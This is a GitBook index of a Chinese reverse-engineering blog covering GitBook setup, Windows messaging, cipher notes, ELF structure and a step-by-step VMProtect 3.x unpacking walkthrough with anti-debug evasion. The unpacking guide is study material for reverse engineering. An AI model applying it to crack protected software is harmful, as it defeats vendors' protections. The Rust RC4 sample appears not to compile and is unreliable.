{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction 欢迎来到我的gitbook，这是一个欢迎页，有任何问题或者建议以及bug可以通过邮件 crootkit@gmail.com 发我，不胜感激 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-18 11:15:01 "},"MyArticles/构建gitbook.html":{"url":"MyArticles/构建gitbook.html","title":"写在开始，how2gitbook","keywords":"","body":"如何在化工原理课堂构建gitbook作为自己的博客 hexo和gitbook对比 没啥好对比的，我就感觉hexo用起来比较方便，比如构建博客，挂在公网或者是github上比较方便；但是我认为那个适合作为一个交流平台，不适合用来笔记；所谓大道至简，hexo的便利性导致他的臃肿性。所以才来尝试使用gitbook来构建博客，与其说是博客，不如说是笔记系统，更加方便简单的笔记系统。 gitbook可以根据不同的类型进行分类，左边的目录支持二级目录（实践发现支持三级目录），小母鹿都在文章里的右边。 而且book对于文章的目录管理非常自由，只有buil的时候可以索引到就可以。 可能别的也可以，但是我不知道，如果任何人来找我关于这个进行争论，别怪我没素质下限 gitbook搭建准备 记录搭建的过程，方便以后快速搭建。或者以备不时之需。 环境准备 需要： github账号，就像是hexo那种####.github.io的那种GitHub page仓库。 npm和node环境，npm需要低版本，高版本的不能匹配gitbook。 脑子，百度，google，梯子 git everything，可以帮助我更加方便的找到安装的文件在哪一个目录里 工具下载 npm install gitbook-cli -g 这里注意需要配置环境变量，在 查看高级系统设置 里，添加对应的目录 之前建议npm进行换源，不然下载可能会出问题。 下载结束之后，在cmd里输入 gitbook --version 需要注意的是如果显示找不到gitbook这个命令，则需要仔细的看一下自己的path有没有填入正确的值。 这时gitbook会进行自己的一个安装和配置。 可能的报错 gitbook报错1： npm版本太高，导致安装失败。 gitbook报错2： 找到报错的那个js文件，进去之后把67行左右的三个连续的代码注释掉，注意，一定不能注释报错行的代码，不然就无法自行安装配置gitbook。 解决上述错误之后重复指令 gitbook --version 出现警告无所谓，等一等等他安装完成。就行。成功后应该是 如果只有第一行的话说明不行，需要重新走一遍--version。并且注意一下那个可能会报错的js文件。 本地环境 自己找一个想放置文章的目录，当做gitbook的本地目录。然后进入目录 我这里用的目录是D:\\myGitbook，进入目录执行： gitbook init 如果没有在目录下生成两个md文件，说明你配错了。建议全部删除然后在npm官网下载msi文件进行安装，而不是下载zip，至于为啥我也不知道，你要是知道可以给我发邮件 crootkit@gmail.com 不胜感激。 目录下的 SUMMARY.md是很重要的，他决定了gitbook左边的目录。通过研究这个文件，可以发现他是怎么对文章进行索引的，这也可以根据他的格式来看到如何索引到我们的文章，所以我在该目录下创建了一个新的目录用来放置我的md文章。 通过命令 gitbook build 可以对本地的项目进行build，这个命令也集合到了gitbook serve里，但是我还是喜欢先build一下。 serve命令可以在本地起一个端口，类似于hexo s命令。 可以在本地起一个服务进行预览。 类似与这样的形势，就是成功了。 下载插件 在稀土掘金上找到了说是需要的12个插件，我稍微删改了一下。 插件需要写在D:\\myGitbook\\book.json中，我的是这样的。 { \"plugins\": [ \"back-to-top-button\", \"chapter-fold\", \"code\", \"splitter\", \"-lunr\", \"-search\", \"search-pro\", \"custom-favicon\", \"tbfed-pagefooter\", \"popup\", \"-sharing\", \"sharing-plus\", \"intopic-toc\" ], \"pluginsConfig\": { \"favicon\": \"./icon/book.ico\", \"tbfed-pagefooter\": { \"copyright\": \"没有版权，随便复制，免费的知识应该共享\", \"modify_label\": \"该文章修订时间：\", \"modify_format\": \"YYYY-MM-DD HH:mm:ss\" }, \"sharing\": { \"douban\": true, \"facebook\": true, \"google\": true, \"pocket\": true, \"qq\": true, \"qzone\": true, \"twitter\": true, \"weibo\": true, \"all\": [ \"douban\", \"facebook\", \"google\", \"instapaper\", \"linkedin\", \"twitter\", \"weibo\", \"messenger\", \"qq\", \"qzone\", \"viber\", \"whatsapp\" ] } } } 然后执行一下gitbook install就可以按部就班的下载了。 当你想添加一个插件时，我是这样解决的： 首先讲原先的book文件改名 建立新的book文件然后写入要更新的插件，进行install操作 然后讲两个book合并 如果新增插件的数量不是很多，可以采用单独下载的方式然后将插件的名称合并到之前book中。 注意：如果在build的时候没有将之前的book合并的话，会出现之前的插件无法索引的情况。 根据网络因素决定下载速度。 下载完成执行 gitbook build gitbook serve 托管到drootkit.github.io 明确一点 进行build之后，会在目录下生成一个_book目录，里面有一个index文件，这个文件就是整个完整的网页。 所以我们只需要把这个目录里的内容同步到github上去就行。 目录里的内容不全是网页需要用到的内容，我们可以创建一个.gitignore里面包含一些不需要提交到网页上的文件。 注意：每一次的build都会刷新_book目录下的所有的文件，导致.git会消失，所以就新建一个目录，每次生成的东西有用的放进去，既省去了gitignore也防止了git每次被刷没。 在这个新的目录里，build之后将生成的文件直接复制进去就可以，但是需要注意的是不要把里面的.git给覆盖掉，里面的git文件夹经过第一次配置好之后，后续就可以直接进行push了，相对比较方便。 上线gitbook 进行build之后，进入_book文件夹： git init #初始化本地git仓库 方法有很多，反正只要把这些文件push上去就行。 至于github的配置，参考hexo的github配置，那个信息比较多。 git config --global user.name \"###\" git config --global user.email \"###@4444.***\" 绑定远程仓库 git remote add origin 你的远程仓库地址 绑定之后因为本地还是master，远程一般是main，所以改一下本地分支 git config --global init.defaultBranch main 然后就三件套 git add . git commit -m \"必须写注释，不然报错\" git push #用-f来强制覆盖之前远程仓库里的东西 然后网页登录看看仓库里有没有东西，有了之后等一会，直接去访问网址就可以访问到gitbook了。 可能的报错 remote 1 遇到push失败（常见于更新的时候） 尝试强制覆盖 git push -u origin main -f 即可成功 2 遇到的新问题，当存在两个名称一样的标题的时候，会自动定位到第一个标题，所以这里的可能的报错我将其后面跟上了remote 玩的开心 可能的自动化脚本 能我哪天把这个搞差不多清楚了还是要写一个自动化的脚本的。不然每次都要手动复制可太麻烦了，一不注意再把我的git覆盖掉，那可是真的操了狗了。 每次加入新的文章之后都要修改summary那个md也是一件麻烦事，但是麻烦带来的高度的可操作性，这一点还是很难平衡的。总之我感觉这个是比hexo要好用的，依赖没有hexo那么多，相对来说也方便配置一点。 import os # 删除git目录中的没有用的md文件，只上传html文件，效果一样（md和png） def cleanGit(): path = 'D:\\\\myGitbook\\\\commit_dir\\\\MyArticles' for root, dirs, files in os.walk(path): for name in files: if (name.endswith(\".md\") or name.endswith(\".png\")): print(name) print(os.path.join(root, name)) os.remove(os.path.join(root, name)) # 删除空目录 # for root, dirs, files in os.walk(path): # if not os.listdir(root): # os.rmdir(root) # 清理本地的build目录，文本和图片 def cleanLocal(): path = 'D:\\\\myGitbook\\\\localOpreat\\\\_book\\\\MyArticles' for root, dirs, files in os.walk(path): for name in files: if (name.endswith(\".md\") or name.endswith(\".png\")): print(name) print(os.path.join(root, name)) os.remove(os.path.join(root, name)) # 删除空目录 # for root, dirs, files in os.walk(path): # if not os.listdir(root): # os.rmdir(root) cleanGit() 删除空目录的代码会出问题，暂时就不写了。 因为每一次写文章都要走一遍过程，相对比较麻烦，于是决定每周向github更新一次或者啥时候开心了就向github推送更新一次。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-22 08:12:55 "},"MyArticles/Reverse.html":{"url":"MyArticles/Reverse.html","title":"Reverse","keywords":"","body":"记录关于在CTF竞赛中的一些逆向题目的题解和一些在五湖四海学来的逆向知识。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-18 16:39:04 "},"MyArticles/Re/Windows消息队列.html":{"url":"MyArticles/Re/Windows消息队列.html","title":"windows 消息队列","keywords":"","body":"一、消息队列 消息队列是在什么时候创建的？ 在线程被第一次创建的时候，当线程第一次被创建时，系统假设他不会被用于与任何用户界面所相关的任务，这样可以有效减少系统资源的使用。当检测到他调用一个和与图形相关的函数的时候，系统为他分配额外的资源 Windows下的应用是基于事件驱动的，他等待系统向其传递输入；dos程序是顺序的、过程驱动的。 Windows消息传递的过程： 用户或应用程序的某些行为会产生一些事件。操作系统找到事件所属的应用程序，然后向该应用程序发送条相应的消息。然后，该消息就被加入到该引用程序的消息队列中。之后，应用程序不断地检杳消息队列，每当接收到一条消息时，应用程序就将该消息分发给与该消息所属窗口相关的窗口过程。最后，窗口过程执行与当前消息对应的指令。 Windows消息队列： Windows操作系统的内核空间中有一个系统消息队列（system message queue），在内核空间中还为每个UI线程分配各自的线程消息队列(Thread message queue)。在发生输入事件之后，Windows操作系统的输入设备驱动程序将输入事件转换为一个“消息”投寄到系统消息队列；操作系统的一个专门线程从系统消息队列取出消息，分发到各个UI线程的输入消息队列中。 Windows的事件驱动模式，并不是操作系统把消息主动分发给应用程序；而是由应用程序的每个UI线程通过“消息循环”代码从UI线程消息队列获取消息 Windows为什么使用句柄： 为什么说句柄是一种指向指针的指针。 由于windows是一种以虚拟内存为基础的操作系统，其内存管理器经常会在内存中来回的移动对象，以此来满足各种应用程序对内存的需求。而对象的移动意味着对象内存地址的变化，正是因为如此，如果直接使用指针，在内存地址被改变后，系统将不知道到哪里去再调用这个对象。windows系统为了解决这个问题，系统专门为各种应用程序腾出了一定的内存地址（句柄）专门用来记录这些变化的地址（这些内存地址就是指向指针的指针），这些内存地址本身是一直不变化的。windows内存管理器在移动某些对象之后，他会将这些对象新的内存地址传给句柄，告诉他移动后对象去了哪里 死锁：Message Deadlocks 原因：发送的消息被处理时被”丢弃”了，而发送与接收的线程是同一队列，这就会导致该线程”死”了。 其实可以看做一个相互等待的场景： a线程发消息1给b线程 b线程处理消息1，回调函数中发了消息2给a a接到消息2，但因为b对消息1的处理结果还没回来而等待 b因为消息2的处理结果还没回来而等待 二、相关API postMessage //消息进入消息队列中后立即返回，消息可能不被处理。 PostThreadMessage //消息放入指定线程的消息队列中后立即返回，消息可能不被处理。 SendMessage //消息进入消息队列中，处理后才返回，如果消息不被处理，发送消息的线程将一直处于阻塞状态，等待消息返回。 SendNotifyMessage//如果消息进入本线程，则为SendMessage()，不是则采取postMessage()，当目标线程仍然依send处理 SendMessageTimeout //消息进入消息队列，处理或超时则返回，实际上SendMessage()就是建立在该函数上的 SendMessageCallback //在本线程再指定一个回调函数，当处理完后再次处理 BroadcastSystemMessage //发送目标为系统组件，比如驱动程序 windows编程 c语言的程序至少有一个主函数main，Windows编程中存在两个主函数 int WINAPI WinMain( HINSTANCE hInstance, // handle to current instance HINSTANCE hPrevInstance, // handle to previous instance LPSTR lpCmdLine, // pointer to command line int nCmdShow // show state of window ); LRESULT CALLBACK WindowProc( HWND hwnd, // handle to window UINT uMsg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter ); 第二个是个callback函数，Windows必须至少一个callback函数 第一个winmain函数用来从消息队列中不断的发现消息，并处理消息（发送给对应的窗口函数） MSG msg; //定义消息名 while (GetMessage (&msg, NULL, 0, 0)) { TranslateMessage (&msg) ; //翻译消息 DispatchMessage (&msg) ; //撤去消息 } return msg.wParam; 关于msg的结构定义，Windows中绝大多数都是基于结构体的体系。 typedef struct tagMSG { // msg HWND hwnd; // 要将消息发送到的目标句柄 UINT message; // 一个消息数字，对应一个消息类型 WPARAM wParam; LPARAM lParam; DWORD time; // 消息放入队列的时间（相对于Windows的时间，不是物理时间） POINT pt; // 消息放队列的鼠标位置 } MSG; sendmessage和postmessage 前者发送消息之后需要等到返回才能返回、后者发送之后直接返回，不需要等待。 因为前者直接调用WndProc消息处理函数，所以需要等待返回之后才能返回。 后者是直接把消息放到消息队列中，所以可以直接返回。 三、实际运用 在开发层面运用很多，可以手动创建窗口，也可以利用MFC或者是利用其他的现成的框架。 细节 程序调用CreateWindowEx函数，将窗口的样式被设置成为WS_EX_TOOLWINDOW，该属性的窗口有以下特点： 不在任务栏显示。 不显示在Alt+Tab的切换列表中。 在任务管理器的窗口管理Tab中不显示。 相当于创建了一个隐形窗口。通过消息机制调用回调函数实现创建子程序，利用回调函数可以自己根据消息执行的特点，可以规避调试。 文章https://www.anquanke.com/post/id/176079#h2-7既没有给出hash，图片还寄了，但是提供了一种恶意代码执行的思路，类似于Windows进程注入中的回调注入方式。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-22 08:08:02 "},"MyArticles/Re/常见加密算法-学习.html":{"url":"MyArticles/Re/常见加密算法-学习.html","title":"加密解密学习 - 更","keywords":"","body":"rc4 利用rust实现的rc4算法，顺便熟练一下rust。 use std::io::{self, Write}; fn rc4(key: &[u8], plaintext: &[u8]) -> Vec { let mut s: [u8; 256] = [0; 256]; let mut j = 0; for i in 0..256 {s[i] = i as u8;} for i in 0..256 { j = (j + s[i] + key[i % key.len()]) % 256; s.swap(i, j); } let mut i = 0; let mut j = 0; let mut ciphertext = Vec::with_capacity(plaintext.len()); for &byte in plaintext { i = (i + 1) % 256; j = (j + s[i]) % 256; s.swap(i, j); let k = s[(s[i] + s[j]) % 256]; ciphertext.push(byte ^ k); } ciphertext } fn main() { let mut input = String::new(); print!(\"Enter your key: \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let key = input.trim().as_bytes(); input.clear(); print!(\"Enter your text: \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let input = input.trim().as_bytes(); let mut output = Vec::new(); loop { input.clear(); print!(\"Do you want to encrypt (e) or decrypt (d) the text? \"); io::stdout().flush().unwrap(); io::stdin().read_line(&mut input).unwrap(); let input = input.trim(); if input == \"e\" { output = rc4(key, input); println!(\"Encrypted text: {:?}\", output); break; } else if input == \"d\" { output = rc4(key, input); println!(\"Decrypted text: {:?}\", output); break; } else { println!(\"Invalid input!\"); } } } 经典的对称加密的流密码，加密解密可以套用同一套公式。 密钥 真正参与运算加密的密钥是根据输入的密钥对数组进行初始化之后的数组数据，并未输入密钥直接参与运算。 密文 密文的产生是一个直接异或的结果，与明文进行异或的值是根据初始化之后的密钥数组进行位置交换、相加、定位后的值。 特征 对于s盒的初始化 相加定位后的异或 %256 ij位置的交换 DES 参考：《图解密码技术》、https://www.ruanx.net/des/ 对称密码、分组加密、基于 Feistel network （费斯妥网络：加密的各个步骤成为“轮”，整个加密过程就是若干次轮的循环） 分组长度：典型des加密分组长度为64位（8字节），不能整除用 PKCS7 / PKCS5 填充（一般）。基于这个网络的设计，可以重复足够多的轮次，而且可以保证解密） 密钥组成：长度64位，第8、16、24、32、40、48、56、64位是校验位，使得每个密钥都有奇数个1 流程图： 密钥 首先去掉特殊的8位，剩下的56位分成两组（28bit/组） 进行循环左移，按照一定的位数移动，两组都移动 密文 明文输入之后先进行分组，分为32+32bit的形式（一组64位，8字节） 一侧明文与【对应轮次产生的子密钥（局部密钥）和另一侧明文】产生的数组进行 xor 另一侧直接落下来 这样就组成了 “密文+明文” 这样的组合,这是一轮的加密，然后对于一个正常的加密就是将上述的结果交换左右，完事继续加密。 每次加密一半，第二次根据第一次加密的结果加密另一半。因为是通过的xor操作进行的加密，所以解密过程也很简单 3des 这个是为了防止des被短时间内爆破出来而做出的改进，就是将DES重复三次，所以他的密钥长度是168bit 这个3des可以在密钥相同的情况下等价于DES加密。 解密 利用相同位置的密钥，将加密和解密对调一下就可以。 AES 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-20 21:25:28 "},"MyArticles/Re/分组密码学习.html":{"url":"MyArticles/Re/分组密码学习.html","title":"分组密码","keywords":"","body":"流密码 像流水一样，从头到尾的一种加密算法。 以一定的bit位数为分组进行加密，结束一个分组的加密就继续进行下一个分组的加密，需要内部保存一个当前的加密状态。对称加密算法基本都是基于分组加密的形式而不是流密码的形式。 分组密码 AES和DES还有3DES等等都是对称加密里的分组密码模式。 模式 因为分组密码对于每一组的加密的明文都是固定长度的，一般情况下都需要对加密算法进行迭代加密。为了解决这个迭代的问题，于是有了下面的常见的几种模式（常见）： 模式的名称都是他的全名的缩写，全名我记不住。 ECB：电子密码本 CBC：密码分组链接模式 CFB：密文反馈模式 OFB：输出反馈模式 CTR：计数器模式 ECB：电子密码本 最简单的、容易被攻击的一种模式，一般没人用。 过程 将明文按照指定的大小分组，然后每一组分别加密，密文按照顺序排列成最终密文。 对应的解密模式也是将密文分组之后分别解密得到明文。 因为11对应的关系，所以被称为电子密码本。 攻击方式 观察密文中的重复序列，可以对应出明文中的重复序列，可以推测明文。 修改密文顺序，直接控制明文顺序 密文替换，利用相同算法的密文替换原来密文中的密文 CBC：密码分组链接 将前一个密文分组和当前明文分组混合起来加密，密文像链条一样相互连接。 过程 首先将本组明文和上一组的密文进行xor之后再进行加密，第一次明文用初始向量IV进行异或 解密过程：因为是xor，所以算法过程完全可逆 加密的链条就是通过xor进行连接的 攻击方式 反转IV中的bit位，通过观察第一组的变化可以达到攻击初始向量IV的效果 CFB：密文反馈 前一个密文分组，会被当作输入，送回算法的输入端（这里体现的“反馈”）。 过程 该模式的加密并不体现在明文和密文的对应上，而是对前一组密文的加密上，当前组明文和前一组密文异或得到这一组的密文。 解密过程： 思路同上述模式 特点 使用分组密码的思想实现的流密码加密方式。初始向量IV相当于一个种子，每次的加密过程相当于产生随机数的过程，但是是伪的。 攻击方式 使用重放攻击。 取相同密钥和iv的两次加密，用第一次加密的后三项内容替换第二次的后三项内容，这样就会导致解密过程中第一组成功解密，第二组密文解密失败，因为被替换，无法通过xor还原，但是后面的可以成功解密达到攻击密文的效果。 OFB：输出反馈 和CFB类似但是不同，也是加密的结果会当作输入再进行操作。但是在这种模式中，初始向量更加重要一下 与CFB模式的比较 OFB反馈的不是明文的密文，而是iv向量的密文 CTR：计数器模式 将逐次累加的计数器进行加密，生成密钥流的流密码 计数器的生成 每次加密的时候先产生一个随机值当作初始值。该数字分为两部分，前面的一部分就是随机数本身，后面的字节就是分组的序号（1，2，3，4……之类的）比如： 与OFB 都属于是流密码，所以存在异同。 ofb利用的加密的输出当作输入，该模式利用的是计数器当作输入。 特点 可以用于并行计算。因为可以以任意顺序对分组进行加密和解密，计数器的值可以由随机数和序号计算得到。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-21 23:34:25 "},"MyArticles/Re/vmp3.5unpacke.html":{"url":"MyArticles/Re/vmp3.5unpacke.html","title":"vmp3.X 工具向脱壳","keywords":"","body":"vmp壳一直是作为加密壳中的一个难啃的骨头，这次从工具使用角度学习一下这个脱壳的过程，本次尝试vmp3.4。3.x的系列都差不多 源码 #include #include #include #include void get_promt() { if(MessageBox(NULL,TEXT(\"context\"),TEXT(\"title\"),MB_OK)) { printf(\"1212121212\\n\"); } else { printf(\"error\"); } } int main() { printf(\"this is main func\\n\"); char str_ptr[] = \"please input a string: \"; char str[128]; char flag[15] = \"aabbccddeeff\"; scanf(\"%s\", str); if(strlen(str) 加壳 使用52破解上找到的vmp软件按照默认的配置对程序进行加壳 都是默认配置，模仿的是大多数的情况，也是常见的一种加密模式。实际上VMP强大之处在于它的虚拟功能，但是默认是关闭的。 得到加密后的程序。大小相比于源程序扩大20倍左右 调试 因为程序多次中断跑飞，所以这些截图可能不是来自同一次进程，所以辩证看待 调试器配置 断点 断点要求：如图 这也是调试器的默认配置，断点不宜太多，会触发vmp的完整性检测。 增强 使用插件sharpOD，这个和xdbg是通用的 添加这些功能是为了防止vmp的一个检测，然后主要选这几个就行，主要是防止被检查调试器。 区段对比 看到相较于正常程序，他出现了vmp0和1两个段。 这是正常的程序区段详情 注意一下地址的范围。 进行调试 找入口点特征 利用gcc编译的，所以需要定位一下start函数的部分，同时需要看到函数入口点的位置特征 看到这个call和jmp的结构，类似于MSVC编译的结构。 call ___security_init_cookie 跟进这个函数，发现两个函数 脱壳 直接在动态调试中找到这两个函数然后下断点，然后通过栈回溯的方式进行定位。 GetSystemTimeAsFileTime --> 在kernelbase中，直接在dll界面下断点就行 另一个同理，下好断点，断点下的要靠后一点，避免VMP的头部断点检测。 直接f9运行，程序断在如下图位置 通过内存布局定位，发现还在vmp区段里，那就继续运行，可能是其他的地方也调用了同样的api函数 直接f9就可以，然后观察啊堆栈窗口 看到返回地址更新了。这一次程序已经来到text区段算是成功进来程序本身了。 看到ida里的伪代码（未加壳的程序）如图 第一个函数已经断进程序本身了，继续运行断第二个api。 需要注意的是，断点下载了kernelbase中，重新调试的时候会出现0xc000007b错误，这时候需要顶着错误进断点界面把俩kernelbse的断点删除，或者删除xdbg的缓存或者改个文件名。 还有需要注意的是，不要一载入程序就下断点，先运行一步到程序领空之后，再去下这个api断点。 看到程序已经跳转到了正常的text段的一个程序里了。 我们开始通过ida可以看到，程序的start函数的形式是一个call+jmp的形式 所以我们继续调试下去，当进入正常text段凌空之后就不要f9了，会直接跑飞，所以慢慢调试。 来到这里，看起来结构和没加科的入口点就很相似了，看了一下基本是一样的，然后直接把eip蹦到sub指令上，然后使用一个github脚本恢复一下iat。 C:\\Users\\Rootkit\\Desktop>vmp3-import-fix -p 16200 start emualte pattern address:00401238 start emualte pattern address:00401433 start emualte pattern address:00401555 start emualte pattern address:00401730 start emualte pattern address:0040178F start emualte pattern address:004017A0 start emualte pattern address:004017A8 start emualte pattern address:004017B1 start emualte pattern address:004017BF start emualte pattern address:00401860 start emualte pattern address:0040186F start emualte pattern address:00401878 start emualte pattern address:0040188A start emualte pattern address:00401B17 start emualte pattern address:00401B6D start emualte pattern address:00401D5E start emualte pattern address:0040207F start emualte pattern address:00402091 start emualte pattern address:004020CC start emualte pattern address:00402122 start emualte pattern address:00402141 start emualte pattern address:00402187 start emualte pattern address:004021C7 start emualte pattern address:00402247 start emualte pattern address:004022AC start emualte pattern address:004026AD start emualte pattern address:004026B5 start emualte pattern address:004026BC start emualte pattern address:004026C4 start emualte pattern address:004026CC start emualte pattern address:004026D4 start emualte pattern address:004026DD start emualte pattern address:004026E5 start emualte pattern address:004026ED start emualte pattern address:004026F4 start emualte pattern address:004026FC start emualte pattern address:00402705 start emualte pattern address:0040270C start emualte pattern address:00402714 start emualte pattern address:0040271D start emualte pattern address:00402724 start emualte pattern address:0040272D start emualte pattern address:00402734 start emualte pattern address:0040273C start emualte pattern address:00402745 start emualte pattern address:0040274C start emualte pattern address:00402754 start emualte pattern address:0040275C start emualte pattern address:00402765 start emualte pattern address:0040276D VirtualAlloc IAT address:00EB0000 完事之后可以去对应的地址看一下是不是真的被复原了。经过验证那些call确实已经被还原名称了。 利用xdbg自带的脚本进行dump，直接dump就可以，dump之后通过cff去观察一下文件的几个指标： 入口点（这里的入口点和源程序的出口点一样的，并没有发生改变） 是否重定位（关掉） 然后点击下面的东西，看一下重定位 之后使用UIF工具进行IAT重建（针对这个进程）。 重建结束之后，使用另一个工具进行[fix dump][https://www.52pojie.cn/thread-66558-1-1.html]而不是xdbg去修复，这里要注意 注意这些参数，防止出问题，然后点击那个get import，之后fixdump即可 将得到的最后的文件放进ida进行查看，可以看到效果已经非常好了 总结 面对一个默认配置加壳的vmp程序的整体的脱壳思路： 定位两个关键api（kernelbase的GetSystemTimeAsFileTime、ntdll的QueryProformanceCounter）。 在api尾部下断点，不要都下载ret之前，最好有一定的辨识度。 观察堆栈，在执行完QueryProformanceCounter的断点之后注意返回text领空的情况。 在text段向上寻找程序入口点，利用dos脚本进行修复。 利用xdbg自带的脚本进行dump。 检查dump文件。 ufi修复进程，IF重建进程后修复dump文件。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-24 09:20:57 "},"MyArticles/Basics.html":{"url":"MyArticles/Basics.html","title":"Basics","keywords":"","body":"合抱之木，生于毫末；百丈之台，起于垒土；千里之行，始于足下。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:38:21 "},"MyArticles/Basics/elf文件结构.html":{"url":"MyArticles/Basics/elf文件结构.html","title":"ELF structure","keywords":"","body":"PE是Windows下的文件，elf是linux下的文件。学习网络前端Windows是主要市场，后端服务端则是linux的天下。学习pe文件结构也要学习elf文件结构。前端的Windows病毒来势凶猛，后端的linux攻击也是防不胜防。挖矿病毒肆虐；僵尸网络横行，不懂elf文件结构怎能进入网络安全这一大主题的门槛。 当时在进行pwn入门的时候，没有学习elf的文件结构，只是知道了怎么用，在哪里用，现在了解了文件结构，对以往的pwn知识有了更加深入的理解。 结构综述 ELF文件由四部分组成：ELF头、程序头、节、节头 本文以一个简单的C语言文件当作例子 #include int main() { printf(\"hello world\\n\"); return 0; } 为了方便正常人的思路，记录顺序做了一下调整。 ELF头 可以在文件：/usr/include/elf.h中找到定义 #define EI_NIDENT (16) typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf32_Half e_type; /* Object file type */ Elf32_Half e_machine; /* Architecture */ Elf32_Word e_version; /* Object file version */ Elf32_Addr e_entry; /* Entry point virtual address */ Elf32_Off e_phoff; /* Program header table file offset */ Elf32_Off e_shoff; /* Section header table file offset */ Elf32_Word e_flags; /* Processor-specific flags */ Elf32_Half e_ehsize; /* ELF header size in bytes */ Elf32_Half e_phentsize; /* Program header table entry size */ Elf32_Half e_phnum; /* Program header table entry count */ Elf32_Half e_shentsize; /* Section header table entry size */ Elf32_Half e_shnum; /* Section header table entry count */ Elf32_Half e_shstrndx; /* Section header string table index */ } Elf32_Ehdr; typedef struct { unsigned char e_ident[EI_NIDENT]; /* Magic number and other info */ Elf64_Half e_type; /* Object file type */ Elf64_Half e_machine; /* Architecture */ Elf64_Word e_version; /* Object file version */ Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; /* Processor-specific flags */ Elf64_Half e_ehsize; /* ELF header size in bytes */ Elf64_Half e_phentsize; /* Program header table entry size */ Elf64_Half e_phnum; /* Program header table entry count */ Elf64_Half e_shentsize; /* Section header table entry size */ Elf64_Half e_shnum; /* Section header table entry count */ Elf64_Half e_shstrndx; /* Section header string table index */ } Elf64_Ehdr; 存在32和64两种类型，基本一样的。 Elf64_Half和Elf64_Word是uint16_t uint32_t的预定义 在里面挑了几个重要的，记录一下，其他的不重要的就让他在书上吧。 e_ident数组 该数组首先以特定的4字节字符串开头\\x7fELF，这可以让文件加载器快速的认出来他是一个二进制文件， 通过命令readelf -h learnS 如果在编译的时候不添加-no-pie，这里的entry point addtress就是一个偏移。 e_type 这个多字节数组指定了elf文件的类型，一般有三种类型 ET_REL: 可重定位的对象文件 ET_EXEC：可执行的二进制文件 ET_DYN：共享对象文件（共享库） 例如下面的这个so.2程序 e_phoff和e_shoff e_shoff：section header offset,另一个同理是程序段的偏移，根据这两个值可以找到程序头和节头，一个是64字节，一个是6632字节。 注意：这里可以设置为0，意味着程序不包含程序头表和节头表；这里的地址不是虚拟地址，而是偏移量。 e_ehsize 该字段阐述了elf头部的大小，对于64位程序来说，大小就是64字节；对于32位的程序来说，elf头部的大小是52字节 e_shstrndx 该字段中包含一个名为.shstrndx的和特殊字符串表节相关的头索引。 这个.shstrtab在节头表中，这是一个专用节，包含一个以NULL值结尾的一个ascii数组。一个节一个名称。 readelf -x .shstrtab learnS 通过这个可以用16进制的形势查看内容。 在该头里其他的部分看起来对于逆向分析没有什么作用。 节头表 1.节：elf文件中代码和数据在逻辑上被分为连续的非重叠块，称为节（section）。 2.对于节的描述：没有任何预设的结构体，每个节的结构体取决于内容。每个节由节头描述，节头指定了节的属性。二进制中所有的节的节头都在节头表中。 3.节只是为链接器提供视图，因此是可选部分，不需要链接的二进制文件就不需要节头表，没有节头表，就将e_shoff的值设为 0.当二进制文件创建进程开始执行的时候，并不是所有的节都会载入内存，比如符号信息或者重定位信息。 段和节 二进制文件制定了另一种逻辑组织，称为段，段在文件执行的时候被使用；而节在连接时被使用。 同样在上述目录中，可以找到关于节头的定义 /* Section header. */ typedef struct { Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr sh_addr; /* Section virtual addr at execution */ Elf32_Off sh_offset; /* Section file offset */ Elf32_Word sh_size; /* Section size in bytes */ Elf32_Word sh_link; /* Link to another section */ Elf32_Word sh_info; /* Additional section information */ Elf32_Word sh_addralign; /* Section alignment */ Elf32_Word sh_entsize; /* Entry size if section holds table */ } Elf32_Shdr; typedef struct { Elf64_Word sh_name; /* Section name (string tbl index) */ Elf64_Word sh_type; /* Section type */ Elf64_Xword sh_flags; /* Section flags */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Section size in bytes */ Elf64_Word sh_link; /* Link to another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */ } Elf64_Shdr; sh_name 这是节头的第一个字段，如果被设置，则在字符串表中包含索引；如果索引是0，则该节没有名称。 这里存在一个大致这样的流程。 sh_type 该字段阐述了节的类型，存在多种类型，在链接时会用到，内容不重要。 sh_flags 关于节的其他信息，其中最重要的有三种：SHF_WRITE、SHF_ALLOC 、SHF_EXECINSTR。 SHF_WRITE 在运行时可写，可以用来区分包含静态数据的节和包含变量的节。 SHF_ALLOC 指示在执行二进制文件的时候将该节的内容加载到虚拟内存，虽然在执行时是按照段视图。 SHF_EXECINSTR 指示该节包含可执行指令。 sh_addr、sh_offset、sh_size 描述该节的虚拟地址、文件偏移、节大小。 当设置sh_addr的值为0时，表示节不会加载到虚拟内存中。 其他 其他字段都不重要了 节 通过命令readelf --sections --wide learnS来查看节信息。可以看到节头表第一项由一个NULL项，这是标准的。 Section Headers: [Nr] Name Type Address Off Size ES Flg Lk Inf Al [ 0] NULL 0000000000000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 0000000000400238 000238 00001c 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 0000000000400254 000254 000020 00 A 0 0 4 [ 3] .note.gnu.build-id 